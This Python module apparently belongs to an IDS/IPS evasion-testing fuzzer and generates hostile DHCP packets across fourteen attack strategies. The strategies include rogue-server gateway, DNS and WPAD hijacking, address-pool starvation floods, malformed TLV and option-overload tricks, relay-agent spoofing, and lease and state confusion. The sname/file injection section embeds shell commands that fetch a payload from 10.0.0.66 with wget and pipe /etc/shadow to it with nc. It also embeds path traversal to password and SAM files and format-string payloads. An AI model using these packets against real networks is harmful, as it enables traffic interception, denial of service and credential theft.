import random
import struct
import socket
from protocol.dynamic_data import get_commands, random_buffer_size, has_dynamic_data

# ---------------------------------------------------------------------------
# DHCP (v4) mutation strategies for IDS/IPS evasion testing.
#
# Design (grounded in RFC 2131 + Cymulate DHCP-spoofing research + Snort rules):
#
# DHCP uses UDP ports 67 (server) / 68 (client) and has a 236-byte fixed
# header inherited from BOOTP, followed by a 4-byte magic cookie
# (0x63825363) and variable-length TLV options.  Snort detects DHCP abuse
# through community/subscriber rules that match on magic-cookie presence,
# option patterns, and traffic heuristics.
#
# Each payload is a raw UDP payload (no IP/UDP framing -- the transport
# layer adds that).  Strategies produce BOOTREQUEST (op=1, client->server,
# dst port 67) OR BOOTREPLY (op=2, server->client, dst port 68).
#
# Every payload starts with a structurally recognisable DHCP preamble
# (correct op + magic cookie) so Snort's rule fast-pattern matcher engages
# BEFORE hitting the malicious bytes.
# ---------------------------------------------------------------------------

DHCP_STRATEGIES = [
    "rogue_server_attack",
    "starvation_flood",
    "option_tlv_overflow",
    "option_overload_attack",
    "magic_cookie_corruption",
    "relay_agent_injection",
    "state_machine_violation",
    "bootp_crossover",
    "field_boundary_attack",
    "xid_collision",
    "lease_time_confusion",
    "broadcast_flag_abuse",
    "client_id_spoof",
    "sname_file_injection",
]

DHCP_WEIGHTS = [14, 12, 12, 8, 6, 10, 8, 5, 6, 5, 4, 4, 6, 5]

DHCP_STRATEGY_LABELS = {
    "rogue_server_attack":      "Rogue Server Attack",
    "starvation_flood":         "Starvation Flood",
    "option_tlv_overflow":      "Option TLV Overflow",
    "option_overload_attack":   "Option Overload Attack",
    "magic_cookie_corruption":  "Magic Cookie Corruption",
    "relay_agent_injection":    "Relay Agent Injection",
    "state_machine_violation":  "State Machine Violation",
    "bootp_crossover":          "BOOTP Crossover",
    "field_boundary_attack":    "Field Boundary Attack",
    "xid_collision":            "XID Collision",
    "lease_time_confusion":     "Lease Time Confusion",
    "broadcast_flag_abuse":     "Broadcast Flag Abuse",
    "client_id_spoof":          "Client ID Spoof",
    "sname_file_injection":     "sname/file Injection",
}

_MAGIC_COOKIE = bytes([99, 130, 83, 99])
_DISCOVER = 1; _OFFER = 2; _REQUEST = 3; _DECLINE = 4
_ACK = 5; _NAK = 6; _RELEASE = 7; _INFORM = 8
_BOOTREQUEST = 1; _BOOTREPLY = 2


def _random_mac():
    return bytes([random.randint(0, 255) for _ in range(6)])

def _random_ip():
    return bytes([random.randint(1, 254) for _ in range(4)])

def _opt(code, data):
    return bytes([code, len(data)]) + data

def _opt53(msg_type):
    return _opt(53, bytes([msg_type]))

def _opt_end():
    return b"\xff"

def _opt_pad(n=1):
    return b"\x00" * n


def _dhcp_header(op=_BOOTREQUEST, xid=None, secs=0, flags=0,
                 hops=0, ciaddr=None, yiaddr=None, siaddr=None,
                 giaddr=None, chaddr=None, sname=None, file_field=None):
    if xid is None:
        xid = random.randint(1, 0xFFFFFFFF)
    ciaddr = ciaddr or b"\x00" * 4
    yiaddr = yiaddr or b"\x00" * 4
    siaddr = siaddr or b"\x00" * 4
    giaddr = giaddr or b"\x00" * 4
    chaddr = chaddr or _random_mac()
    sname = sname or b""
    file_field = file_field or b""
    chaddr_padded = (chaddr + b"\x00" * 16)[:16]
    sname_padded = (sname + b"\x00" * 64)[:64]
    file_padded = (file_field + b"\x00" * 128)[:128]
    hdr = struct.pack("!BBBB I HH 4s 4s 4s 4s",
                      op, 1, 6, hops, xid, secs, flags,
                      ciaddr, yiaddr, siaddr, giaddr)
    return hdr + chaddr_padded + sname_padded + file_padded


def _dhcp_packet(op=_BOOTREQUEST, xid=None, secs=0, flags=0x8000,
                 hops=0, ciaddr=None, yiaddr=None, siaddr=None,
                 giaddr=None, chaddr=None, sname=None, file_field=None,
                 options=None):
    hdr = _dhcp_header(op, xid, secs, flags, hops, ciaddr, yiaddr,
                       siaddr, giaddr, chaddr, sname, file_field)
    if options is None:
        options = _opt53(_DISCOVER) + _opt_end()
    return hdr + _MAGIC_COOKIE + options


def build_dhcp_payload(strategy):
    """Build one DHCP payload. Returns (payload_bytes, dst_port).
    dst_port is 67 (client->server) or 68 (server->client)."""

    if strategy == "rogue_server_attack":
        return _build_rogue_server()
    elif strategy == "starvation_flood":
        return _build_starvation()
    elif strategy == "option_tlv_overflow":
        return _build_option_overflow()
    elif strategy == "option_overload_attack":
        return _build_option_overload()
    elif strategy == "magic_cookie_corruption":
        return _build_magic_cookie()
    elif strategy == "relay_agent_injection":
        return _build_relay_injection()
    elif strategy == "state_machine_violation":
        return _build_state_violation()
    elif strategy == "bootp_crossover":
        return _build_bootp_crossover()
    elif strategy == "field_boundary_attack":
        return _build_field_boundary()
    elif strategy == "xid_collision":
        return _build_xid_collision()
    elif strategy == "lease_time_confusion":
        return _build_lease_confusion()
    elif strategy == "broadcast_flag_abuse":
        return _build_broadcast_abuse()
    elif strategy == "client_id_spoof":
        return _build_client_id_spoof()
    elif strategy == "sname_file_injection":
        return _build_sname_injection()
    else:
        return _dhcp_packet(options=_opt53(_DISCOVER) + _opt_end()), 67


# ── Strategy implementations ───────────────────────────────────────────────

def _build_rogue_server():
    """Rogue DHCPOFFER/DHCPACK with attacker-controlled gateway/DNS/WPAD.
    Cymulate: attacker impersonates DHCP server, redirects traffic."""
    atk = bytes([10, 0, 0, 66])
    offered = bytes([192, 168, random.randint(1, 254), random.randint(2, 254)])
    srv = bytes([10, 0, 0, 66])
    variant = random.choice(["gw_redirect", "dns_hijack", "wpad", "full_mitm",
                              "rapid_offers", "nak_then_offer"])
    if variant == "gw_redirect":
        opts = (_opt53(_OFFER) + _opt(54, srv) + _opt(51, struct.pack("!I", 86400)) +
                _opt(1, b"\xff\xff\xff\x00") + _opt(3, atk) +
                _opt(6, b"\x08\x08\x08\x08") + _opt_end())
        return _dhcp_packet(op=_BOOTREPLY, yiaddr=offered, siaddr=srv, options=opts), 68
    elif variant == "dns_hijack":
        opts = (_opt53(_ACK) + _opt(54, srv) + _opt(51, struct.pack("!I", 3600)) +
                _opt(1, b"\xff\xff\xff\x00") + _opt(3, b"\xc0\xa8\x01\x01") +
                _opt(6, atk + bytes([10, 0, 0, 67])) + _opt_end())
        return _dhcp_packet(op=_BOOTREPLY, yiaddr=offered, siaddr=srv, options=opts), 68
    elif variant == "wpad":
        opts = (_opt53(_ACK) + _opt(54, srv) + _opt(51, struct.pack("!I", 86400)) +
                _opt(1, b"\xff\xff\xff\x00") + _opt(3, b"\xc0\xa8\x01\x01") +
                _opt(6, b"\x08\x08\x08\x08") +
                _opt(252, b"http://10.0.0.66/wpad.dat") + _opt_end())
        return _dhcp_packet(op=_BOOTREPLY, yiaddr=offered, siaddr=srv, options=opts), 68
    elif variant == "full_mitm":
        opts = (_opt53(_OFFER) + _opt(54, srv) + _opt(51, struct.pack("!I", 43200)) +
                _opt(1, b"\xff\xff\xff\x00") + _opt(3, atk) + _opt(6, atk) +
                _opt(42, atk) + _opt(252, b"http://10.0.0.66/wpad.dat") +
                _opt(15, b"evil.local") + _opt_end())
        return _dhcp_packet(op=_BOOTREPLY, yiaddr=offered, siaddr=srv, options=opts), 68
    elif variant == "rapid_offers":
        xid = random.randint(1, 0xFFFFFFFF)
        pkts = b""
        for _ in range(20):
            ip = bytes([192, 168, 1, random.randint(100, 200)])
            opts = (_opt53(_OFFER) + _opt(54, srv) + _opt(51, struct.pack("!I", 300)) +
                    _opt(1, b"\xff\xff\xff\x00") + _opt(3, atk) + _opt(6, atk) + _opt_end())
            pkts += _dhcp_packet(op=_BOOTREPLY, xid=xid, yiaddr=ip, siaddr=srv, options=opts)
        return pkts, 68
    else:  # nak_then_offer
        xid = random.randint(1, 0xFFFFFFFF)
        nak = _dhcp_packet(op=_BOOTREPLY, xid=xid, options=_opt53(_NAK) + _opt(54, srv) + _opt_end())
        offer_opts = (_opt53(_OFFER) + _opt(54, srv) + _opt(51, struct.pack("!I", 86400)) +
                     _opt(1, b"\xff\xff\xff\x00") + _opt(3, atk) + _opt(6, atk) + _opt_end())
        offer = _dhcp_packet(op=_BOOTREPLY, xid=xid, yiaddr=offered, siaddr=srv, options=offer_opts)
        return nak + offer, 68


def _build_starvation():
    """Mass DHCPDISCOVER with unique MACs to exhaust server address pool."""
    variant = random.choice(["burst", "slow_drip", "vendor_mix", "req_confirm", "decline", "inform"])
    if variant == "burst":
        pkts = b""
        for _ in range(50):
            opts = _opt53(_DISCOVER) + _opt(55, bytes([1, 3, 6, 15, 28, 42])) + _opt_end()
            pkts += _dhcp_packet(chaddr=_random_mac(), flags=0x8000, options=opts)
        return pkts, 67
    elif variant == "slow_drip":
        vendors = [b"MSFT 5.0", b"dhcpcd-6.11.5", b"udhcp 1.25.1", b"android-dhcp-10"]
        pkts = b""
        for _ in range(15):
            mac = _random_mac()
            opts = (_opt53(_DISCOVER) + _opt(60, random.choice(vendors)) +
                    _opt(12, b"host-" + bytes(random.choices(b"abcdef0123456789", k=8))) +
                    _opt(55, bytes([1, 3, 6, 15, 28, 42, 119, 252])) + _opt_end())
            pkts += _dhcp_packet(chaddr=mac, flags=0x8000, options=opts)
        return pkts, 67
    elif variant == "vendor_mix":
        pkts = b""
        for _ in range(30):
            mac = _random_mac()
            client_id = bytes([0x01]) + mac
            opts = (_opt53(_DISCOVER) + _opt(61, client_id) +
                    _opt(60, random.choice([b"MSFT 5.0", b"dhcpcd-9.4.1", b"Linux 5.15.0"])) +
                    _opt(55, bytes([1, 3, 6, 15])) + _opt_end())
            pkts += _dhcp_packet(chaddr=mac, flags=0x8000, options=opts)
        return pkts, 67
    elif variant == "req_confirm":
        pkts = b""
        for i in range(25):
            mac = _random_mac()
            xid = random.randint(1, 0xFFFFFFFF)
            pkts += _dhcp_packet(chaddr=mac, xid=xid, flags=0x8000,
                                  options=_opt53(_DISCOVER) + _opt(55, bytes([1, 3, 6])) + _opt_end())
            req_ip = bytes([192, 168, 1, (i + 10) % 255])
            pkts += _dhcp_packet(chaddr=mac, xid=xid, flags=0x8000,
                                  options=_opt53(_REQUEST) + _opt(50, req_ip) +
                                  _opt(54, b"\xc0\xa8\x01\x01") + _opt_end())
        return pkts, 67
    elif variant == "decline":
        pkts = b""
        for i in range(40):
            opts = (_opt53(_DECLINE) + _opt(50, bytes([192, 168, 1, (i + 2) % 255])) +
                    _opt(54, b"\xc0\xa8\x01\x01") + _opt_end())
            pkts += _dhcp_packet(chaddr=_random_mac(), options=opts)
        return pkts, 67
    else:  # inform
        pkts = b""
        for _ in range(30):
            opts = _opt53(_INFORM) + _opt(55, bytes([1, 6, 15, 42, 252])) + _opt_end()
            pkts += _dhcp_packet(ciaddr=_random_ip(), chaddr=_random_mac(), options=opts)
        return pkts, 67


def _build_option_overflow():
    """TLV option parsing abuse: oversized, truncated, missing end, duplicates."""
    variant = random.choice(["max_len", "len_exceeds", "no_end", "past_end",
                              "many_tiny", "dup_msgtype", "zero_len", "chain_bomb"])
    if variant == "max_len":
        opts = _opt53(_DISCOVER) + _opt(43, bytes([0xAA] * 255)) + _opt_end()
        return _dhcp_packet(options=opts), 67
    elif variant == "len_exceeds":
        opts = _opt53(_DISCOVER) + bytes([43, 200]) + b"\xBB" * 10
        return _dhcp_packet(options=opts), 67
    elif variant == "no_end":
        opts = _opt53(_DISCOVER) + _opt(12, b"no-end-host") + _opt(55, bytes([1, 3, 6]))
        return _dhcp_packet(options=opts), 67
    elif variant == "past_end":
        hidden = _opt(6, bytes([10, 0, 0, 66]))
        opts = _opt53(_DISCOVER) + _opt_end() + hidden + _opt(3, bytes([10, 0, 0, 66]))
        return _dhcp_packet(options=opts), 67
    elif variant == "many_tiny":
        opts = _opt53(_DISCOVER)
        for i in range(200):
            code = ((i % 200) + 10) % 254
            if code in (0, 53, 255): code = 128
            opts += _opt(code, bytes([i & 0xFF]))
        opts += _opt_end()
        return _dhcp_packet(options=opts), 67
    elif variant == "dup_msgtype":
        opts = _opt53(_DISCOVER) + _opt(12, b"victim") + _opt53(_REQUEST) + _opt_end()
        return _dhcp_packet(options=opts), 67
    elif variant == "zero_len":
        opts = _opt53(_DISCOVER)
        for code in [12, 15, 28, 42, 60]:
            opts += bytes([code, 0])
        opts += _opt_end()
        return _dhcp_packet(options=opts), 67
    else:  # chain_bomb
        opts = _opt53(_DISCOVER)
        total = 0
        while total < 1200:
            dl = random.randint(1, 80)
            code = random.randint(10, 254)
            if code == 53: code = 128
            chunk = _opt(code, bytes(random.choices(range(256), k=dl)))
            opts += chunk
            total += len(chunk)
        opts += _opt_end()
        return _dhcp_packet(options=opts), 67


def _build_option_overload():
    """Option 52 overload: parse sname/file as options. Semantic gap between
    IDS (reads main options) and server (also reads sname/file)."""
    variant = random.choice(["sname", "file", "both", "conflict_dns", "no_end", "nested"])
    if variant == "sname":
        sname_opts = (_opt(6, bytes([10, 0, 0, 66])) + _opt_end() + b"\x00" * 40)[:64]
        main = _opt53(_DISCOVER) + _opt(52, b"\x01") + _opt(55, bytes([1, 3, 6, 15])) + _opt_end()
        return _dhcp_packet(sname=sname_opts, options=main), 67
    elif variant == "file":
        file_opts = (_opt(3, bytes([10, 0, 0, 66])) + _opt(6, bytes([10, 0, 0, 67])) +
                     _opt_end() + b"\x00" * 90)[:128]
        main = _opt53(_ACK) + _opt(52, b"\x02") + _opt_end()
        return _dhcp_packet(op=_BOOTREPLY, file_field=file_opts, options=main), 68
    elif variant == "both":
        sn = (_opt(3, bytes([10, 0, 0, 66])) + _opt_end() + b"\x00" * 48)[:64]
        fl = (_opt(6, bytes([10, 0, 0, 67])) + _opt_end() + b"\x00" * 110)[:128]
        main = _opt53(_OFFER) + _opt(52, b"\x03") + _opt_end()
        return _dhcp_packet(op=_BOOTREPLY, sname=sn, file_field=fl, options=main), 68
    elif variant == "conflict_dns":
        sn = (_opt(6, bytes([10, 0, 0, 66])) + _opt_end() + b"\x00" * 44)[:64]
        main = _opt53(_ACK) + _opt(52, b"\x01") + _opt(6, b"\x08\x08\x08\x08") + _opt_end()
        return _dhcp_packet(op=_BOOTREPLY, sname=sn, options=main), 68
    elif variant == "no_end":
        sn = (_opt(6, bytes([10, 0, 0, 66])) + _opt(3, bytes([10, 0, 0, 66])) + b"\x00" * 40)[:64]
        main = _opt53(_DISCOVER) + _opt(52, b"\x01") + _opt_end()
        return _dhcp_packet(sname=sn, options=main), 67
    else:  # nested
        sn = (_opt(52, b"\x02") + _opt(6, bytes([10, 0, 0, 66])) + _opt_end() + b"\x00" * 42)[:64]
        main = _opt53(_DISCOVER) + _opt(52, b"\x01") + _opt_end()
        return _dhcp_packet(sname=sn, options=main), 67


def _build_magic_cookie():
    """Magic cookie (0x63825363) manipulation. Wrong cookie = IDS may skip option parsing."""
    variant = random.choice(["wrong", "zero", "partial", "bootp_vendor", "shifted", "doubled"])
    hdr = _dhcp_header()
    opts = _opt53(_DISCOVER) + _opt_end()
    if variant == "wrong":
        return hdr + bytes([0x63, 0x82, 0x53, 0x00]) + opts, 67
    elif variant == "zero":
        return hdr + b"\x00\x00\x00\x00" + b"\x00" * 64 + bytes([10, 0, 0, 66]) * 16, 67
    elif variant == "partial":
        return hdr + bytes([99, 130, 0, 0]) + opts, 67
    elif variant == "bootp_vendor":
        return hdr + bytes(random.choices(range(256), k=312)), 67
    elif variant == "shifted":
        return hdr + b"\x00" * 4 + _MAGIC_COOKIE + opts, 67
    else:  # doubled
        return hdr + _MAGIC_COOKIE + _MAGIC_COOKIE + opts, 67


def _build_relay_injection():
    """Option 82 (Relay Agent Information) manipulation for access control bypass."""
    variant = random.choice(["spoofed_circuit", "oversized_sub", "contradict_giaddr",
                              "multi_opt82", "nested_sub", "fake_chain"])
    gi = bytes([10, 0, 1, 1])
    if variant == "spoofed_circuit":
        circuit = b"\x01\x07Gi0/0/1"
        remote = b"\x02\x06" + _random_mac()
        opt82 = _opt(82, circuit + remote)
        opts = _opt53(_DISCOVER) + opt82 + _opt(55, bytes([1, 3, 6])) + _opt_end()
        return _dhcp_packet(giaddr=gi, options=opts), 67
    elif variant == "oversized_sub":
        big = b"\x01\xfa" + b"X" * 250
        opts = _opt53(_DISCOVER) + _opt(82, big) + _opt_end()
        return _dhcp_packet(giaddr=gi, options=opts), 67
    elif variant == "contradict_giaddr":
        circuit = b"\x01\x07Vlan200"
        opts = _opt53(_DISCOVER) + _opt(82, circuit) + _opt(55, bytes([1, 3, 6])) + _opt_end()
        return _dhcp_packet(giaddr=gi, options=opts), 67
    elif variant == "multi_opt82":
        a = _opt(82, b"\x01\x04Gi01")
        b_ = _opt(82, b"\x01\x04Gi99")
        opts = _opt53(_DISCOVER) + a + b_ + _opt_end()
        return _dhcp_packet(giaddr=gi, options=opts), 67
    elif variant == "nested_sub":
        inner = b"\x01\x06\x01\x04Gi01"
        opts = _opt53(_DISCOVER) + _opt(82, inner + b"\x02\x06" + _random_mac()) + _opt_end()
        return _dhcp_packet(giaddr=gi, options=opts), 67
    else:  # fake_chain
        circuit = b"\x01\x08Gi0/0/24"
        remote = b"\x02\x06" + _random_mac()
        opts = _opt53(_DISCOVER) + _opt(82, circuit + remote) + _opt_end()
        hdr = _dhcp_header(hops=3, giaddr=gi)
        return hdr + _MAGIC_COOKIE + opts, 67


def _build_state_violation():
    """Illegal DHCP state transitions to confuse stateful IDS detectors."""
    variant = random.choice(["req_no_disc", "release_reuse", "forcerenew",
                              "rapid_dora", "decline_first", "double_disc"])
    mac = _random_mac()
    xid = random.randint(1, 0xFFFFFFFF)
    if variant == "req_no_disc":
        opts = _opt53(_REQUEST) + _opt(50, bytes([192, 168, 1, 100])) + _opt_end()
        return _dhcp_packet(chaddr=mac, xid=xid, options=opts), 67
    elif variant == "release_reuse":
        rel = _dhcp_packet(chaddr=mac, xid=xid, ciaddr=bytes([192, 168, 1, 100]),
                           options=_opt53(_RELEASE) + _opt(54, b"\xc0\xa8\x01\x01") + _opt_end())
        req = _dhcp_packet(chaddr=mac, xid=xid + 1,
                           options=_opt53(_REQUEST) + _opt(50, bytes([192, 168, 1, 100])) +
                           _opt(54, b"\xc0\xa8\x01\x01") + _opt_end())
        return rel + req, 67
    elif variant == "forcerenew":
        opts = _opt53(9) + _opt(54, b"\xc0\xa8\x01\x01") + _opt_end()
        return _dhcp_packet(op=_BOOTREPLY, chaddr=mac, xid=xid, options=opts), 68
    elif variant == "rapid_dora":
        pkts = b""
        for i in range(10):
            x = random.randint(1, 0xFFFFFFFF)
            m = _random_mac()
            pkts += _dhcp_packet(chaddr=m, xid=x, flags=0x8000,
                                  options=_opt53(_DISCOVER) + _opt_end())
            pkts += _dhcp_packet(chaddr=m, xid=x, flags=0x8000,
                                  options=_opt53(_REQUEST) + _opt(50, bytes([192, 168, 1, (i + 10) % 255])) +
                                  _opt(54, b"\xc0\xa8\x01\x01") + _opt_end())
            pkts += _dhcp_packet(chaddr=m, xid=x, ciaddr=bytes([192, 168, 1, (i + 10) % 255]),
                                  options=_opt53(_RELEASE) + _opt(54, b"\xc0\xa8\x01\x01") + _opt_end())
        return pkts, 67
    elif variant == "decline_first":
        opts = _opt53(_DECLINE) + _opt(50, bytes([192, 168, 1, 50])) + _opt(54, b"\xc0\xa8\x01\x01") + _opt_end()
        return _dhcp_packet(chaddr=mac, xid=xid, options=opts), 67
    else:  # double_disc
        pkts = b""
        for _ in range(20):
            pkts += _dhcp_packet(chaddr=mac, xid=xid, flags=0x8000,
                                  options=_opt53(_DISCOVER) + _opt_end())
        return pkts, 67


def _build_bootp_crossover():
    """Pure BOOTP / mixed BOOTP-DHCP to bypass DHCP-specific IDS rules."""
    variant = random.choice(["pure_bootp", "bootp_with_vendor", "mixed", "op_mismatch"])
    if variant == "pure_bootp":
        hdr = _dhcp_header()
        return hdr + b"\x00" * 312, 67
    elif variant == "bootp_with_vendor":
        hdr = _dhcp_header()
        vendor = _MAGIC_COOKIE + b"\x00" * 308
        return hdr + vendor, 67
    elif variant == "mixed":
        bootp = _dhcp_header()
        dhcp = _dhcp_packet(options=_opt53(_DISCOVER) + _opt_end())
        return bootp + b"\x00" * 64 + dhcp, 67
    else:  # op_mismatch
        opts = _opt53(_DISCOVER) + _opt_end()
        return _dhcp_packet(op=_BOOTREPLY, options=opts), 67


def _build_field_boundary():
    """Fixed-header field size abuse: chaddr overflow, truncation, oversized packets."""
    variant = random.choice(["hlen_overflow", "truncated", "oversized", "null_sname", "secs_max"])
    if variant == "hlen_overflow":
        hdr = bytearray(_dhcp_header())
        hdr[2] = 20  # hlen=20 but chaddr is only 16 bytes -- parser reads past field
        opts = _opt53(_DISCOVER) + _opt_end()
        return bytes(hdr) + _MAGIC_COOKIE + opts, 67
    elif variant == "truncated":
        full = _dhcp_packet(options=_opt53(_DISCOVER) + _opt_end())
        return full[:100], 67  # Cut mid-header
    elif variant == "oversized":
        opts = _opt53(_DISCOVER) + _opt(43, bytes([0xCC] * 255)) * 4 + _opt_end()
        return _dhcp_packet(options=opts), 67
    elif variant == "null_sname":
        sn = b"\x00" * 32 + b"\x41" * 32
        opts = _opt53(_DISCOVER) + _opt_end()
        return _dhcp_packet(sname=sn, options=opts), 67
    else:  # secs_max
        opts = _opt53(_DISCOVER) + _opt_end()
        return _dhcp_packet(secs=0xFFFF, options=opts), 67


def _build_xid_collision():
    """Transaction ID manipulation: reuse, extremes, collision."""
    variant = random.choice(["reuse", "zero", "max", "rapid_cycle", "multi_client_same"])
    if variant == "reuse":
        xid = 0xDEADBEEF
        pkts = b""
        for _ in range(10):
            pkts += _dhcp_packet(xid=xid, chaddr=_random_mac(), flags=0x8000,
                                  options=_opt53(_DISCOVER) + _opt_end())
        return pkts, 67
    elif variant == "zero":
        return _dhcp_packet(xid=0, flags=0x8000, options=_opt53(_DISCOVER) + _opt_end()), 67
    elif variant == "max":
        return _dhcp_packet(xid=0xFFFFFFFF, flags=0x8000, options=_opt53(_DISCOVER) + _opt_end()), 67
    elif variant == "rapid_cycle":
        pkts = b""
        for i in range(30):
            pkts += _dhcp_packet(xid=i, chaddr=_random_mac(), flags=0x8000,
                                  options=_opt53(_DISCOVER) + _opt_end())
        return pkts, 67
    else:  # multi_client_same
        xid = random.randint(1, 0xFFFFFFFF)
        pkts = b""
        for _ in range(15):
            pkts += _dhcp_packet(xid=xid, chaddr=_random_mac(), flags=0x8000,
                                  options=_opt53(_DISCOVER) + _opt_end())
            pkts += _dhcp_packet(xid=xid, chaddr=_random_mac(), flags=0x8000,
                                  options=_opt53(_REQUEST) + _opt(50, _random_ip()) + _opt_end())
        return pkts, 67


def _build_lease_confusion():
    """Lease time option manipulation to confuse IDS timers."""
    variant = random.choice(["zero_lease", "infinite", "reversed_t1t2", "micro_lease", "negative_like"])
    srv = bytes([192, 168, 1, 1])
    ip = bytes([192, 168, 1, 100])
    if variant == "zero_lease":
        opts = (_opt53(_ACK) + _opt(54, srv) + _opt(51, struct.pack("!I", 0)) +
                _opt(1, b"\xff\xff\xff\x00") + _opt(3, srv) + _opt_end())
        return _dhcp_packet(op=_BOOTREPLY, yiaddr=ip, options=opts), 68
    elif variant == "infinite":
        opts = (_opt53(_ACK) + _opt(54, srv) + _opt(51, b"\xff\xff\xff\xff") +
                _opt(1, b"\xff\xff\xff\x00") + _opt(3, srv) + _opt_end())
        return _dhcp_packet(op=_BOOTREPLY, yiaddr=ip, options=opts), 68
    elif variant == "reversed_t1t2":
        opts = (_opt53(_ACK) + _opt(54, srv) + _opt(51, struct.pack("!I", 86400)) +
                _opt(58, struct.pack("!I", 80000)) +  # T1 > T2
                _opt(59, struct.pack("!I", 40000)) +
                _opt(1, b"\xff\xff\xff\x00") + _opt(3, srv) + _opt_end())
        return _dhcp_packet(op=_BOOTREPLY, yiaddr=ip, options=opts), 68
    elif variant == "micro_lease":
        opts = (_opt53(_ACK) + _opt(54, srv) + _opt(51, struct.pack("!I", 1)) +
                _opt(58, struct.pack("!I", 0)) + _opt(59, struct.pack("!I", 0)) +
                _opt(1, b"\xff\xff\xff\x00") + _opt(3, srv) + _opt_end())
        return _dhcp_packet(op=_BOOTREPLY, yiaddr=ip, options=opts), 68
    else:  # negative_like (high bit set, looks negative in signed int)
        opts = (_opt53(_ACK) + _opt(54, srv) + _opt(51, struct.pack("!I", 0x80000001)) +
                _opt(1, b"\xff\xff\xff\x00") + _opt(3, srv) + _opt_end())
        return _dhcp_packet(op=_BOOTREPLY, yiaddr=ip, options=opts), 68


def _build_broadcast_abuse():
    """Broadcast flag and reserved-bit manipulation."""
    variant = random.choice(["reserved_bits", "bcast_on_renew", "clear_on_disc", "flags_ffff"])
    if variant == "reserved_bits":
        opts = _opt53(_DISCOVER) + _opt_end()
        return _dhcp_packet(flags=0x7FFF, options=opts), 67  # All reserved bits set
    elif variant == "bcast_on_renew":
        opts = _opt53(_REQUEST) + _opt(50, bytes([192, 168, 1, 100])) + _opt_end()
        return _dhcp_packet(flags=0x8000, ciaddr=bytes([192, 168, 1, 100]), options=opts), 67
    elif variant == "clear_on_disc":
        opts = _opt53(_DISCOVER) + _opt_end()
        return _dhcp_packet(flags=0x0000, options=opts), 67
    else:  # flags_ffff
        opts = _opt53(_DISCOVER) + _opt_end()
        return _dhcp_packet(flags=0xFFFF, options=opts), 67


def _build_client_id_spoof():
    """Option 61 (client identifier) manipulation for identity confusion."""
    variant = random.choice(["oversized", "contradict_chaddr", "multi_opt61",
                              "empty", "type_manip", "hardware_mismatch"])
    mac = _random_mac()
    if variant == "oversized":
        big_id = bytes([0x01]) + bytes(random.choices(range(256), k=200))
        opts = _opt53(_DISCOVER) + _opt(61, big_id) + _opt_end()
        return _dhcp_packet(chaddr=mac, options=opts), 67
    elif variant == "contradict_chaddr":
        diff_mac = _random_mac()
        client_id = bytes([0x01]) + diff_mac
        opts = _opt53(_DISCOVER) + _opt(61, client_id) + _opt_end()
        return _dhcp_packet(chaddr=mac, options=opts), 67
    elif variant == "multi_opt61":
        id1 = bytes([0x01]) + mac
        id2 = bytes([0x01]) + _random_mac()
        opts = _opt53(_DISCOVER) + _opt(61, id1) + _opt(61, id2) + _opt_end()
        return _dhcp_packet(chaddr=mac, options=opts), 67
    elif variant == "empty":
        opts = _opt53(_DISCOVER) + bytes([61, 0]) + _opt_end()
        return _dhcp_packet(chaddr=mac, options=opts), 67
    elif variant == "type_manip":
        client_id = bytes([0xFF]) + mac  # Invalid hardware type
        opts = _opt53(_DISCOVER) + _opt(61, client_id) + _opt_end()
        return _dhcp_packet(chaddr=mac, options=opts), 67
    else:  # hardware_mismatch
        hdr = bytearray(_dhcp_header(chaddr=mac))
        hdr[1] = 6  # htype=6 (IEEE 802) but chaddr is Ethernet MAC
        opts = _opt53(_DISCOVER) + _opt_end()
        return bytes(hdr) + _MAGIC_COOKIE + opts, 67


def _build_sname_injection():
    """Embed payloads in sname (64B) and file (128B) fields."""
    variant = random.choice(["path_traversal", "shell_meta", "format_string",
                              "overflow_boundary", "embedded_opts", "binary_payload"])
    if variant == "path_traversal":
        sn = b"../../../../etc/passwd\x00" + b"\x00" * 40
        fl = b"../../../windows/system32/config/sam\x00" + b"\x00" * 90
        opts = _opt53(_DISCOVER) + _opt_end()
        return _dhcp_packet(sname=sn, file_field=fl, options=opts), 67
    elif variant == "shell_meta":
        sn = b"$(wget 10.0.0.66/pwn)\x00" + b"\x00" * 42
        fl = b"; cat /etc/shadow | nc 10.0.0.66 4444\x00" + b"\x00" * 88
        opts = _opt53(_DISCOVER) + _opt_end()
        return _dhcp_packet(sname=sn, file_field=fl, options=opts), 67
    elif variant == "format_string":
        sn = (b"%n%n%n%n%x%x%x%x" * 4)[:64]
        fl = (b"%s%s%s%s%n%n%n%n" * 8)[:128]
        opts = _opt53(_DISCOVER) + _opt_end()
        return _dhcp_packet(sname=sn, file_field=fl, options=opts), 67
    elif variant == "overflow_boundary":
        sn = b"\x41" * 64  # No null terminator
        fl = b"\x42" * 128  # No null terminator
        opts = _opt53(_DISCOVER) + _opt_end()
        return _dhcp_packet(sname=sn, file_field=fl, options=opts), 67
    elif variant == "embedded_opts":
        sn = (_MAGIC_COOKIE + _opt(6, bytes([10, 0, 0, 66])) + _opt_end() + b"\x00" * 30)[:64]
        fl = (_MAGIC_COOKIE + _opt(3, bytes([10, 0, 0, 66])) + _opt_end() + b"\x00" * 90)[:128]
        opts = _opt53(_DISCOVER) + _opt_end()
        return _dhcp_packet(sname=sn, file_field=fl, options=opts), 67
    else:  # binary_payload
        sn = bytes(random.choices(range(256), k=64))
        fl = bytes(random.choices(range(256), k=128))
        opts = _opt53(_DISCOVER) + _opt_end()
        return _dhcp_packet(sname=sn, file_field=fl, options=opts), 67


# ── Mutator class ──────────────────────────────────────────────────────────

class DhcpMutator:
    def __init__(self, external_weights=None, bandit=None):
        self.strategies = DHCP_STRATEGIES
        self._external_weights = external_weights
        self._bandit = bandit

    @property
    def weights(self):
        if self._external_weights:
            return [self._external_weights.get(s, 5) for s in self.strategies]
        return DHCP_WEIGHTS

    def mutate(self):
        """Returns (payload_bytes, strategy_name, dst_port)."""
        if self._bandit:
            strategy = self._bandit.select_with_weights(self._external_weights or {})
        else:
            strategy = random.choices(self.strategies, weights=self.weights, k=1)[0]
        payload, dst_port = build_dhcp_payload(strategy)
        return payload, strategy, dst_port
